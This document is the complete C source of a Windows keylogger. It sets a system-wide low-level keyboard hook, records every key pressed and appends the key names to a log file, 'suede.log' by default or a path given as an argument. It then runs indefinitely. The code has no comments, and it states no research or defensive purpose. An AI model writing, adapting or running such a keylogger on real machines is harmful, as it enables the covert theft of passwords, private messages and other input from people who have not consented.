#include <stdio.h>
#include <windows.h>
HHOOK hk;
char * kg;

LRESULT KeyEvent(int hc, WPARAM id, KBDLLHOOKSTRUCT * kd) {
  DWORD mesg = 1;
  mesg += kd->scanCode << 16;
  mesg += kd->flags << 24;
  char kn[] = "Windows Right";
  GetKeyNameText(mesg, kn, sizeof kn);
  FILE * fpt = fopen(kg, "a");
  if (id == WM_KEYDOWN) {
    fprintf(fpt, "_%s", kn);
    fflush(fpt);
  }
  return CallNextHookEx(hk, hc, id, (LPARAM) kd);
}

int main(int argc, char * argv[]) {
  if (argc == 1)
    kg = "suede.log";
  else
    kg = argv[1];
  hk = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) KeyEvent, 0, 0);
  while (1) {
    GetMessage(0, 0, 0, 0);
  }
}
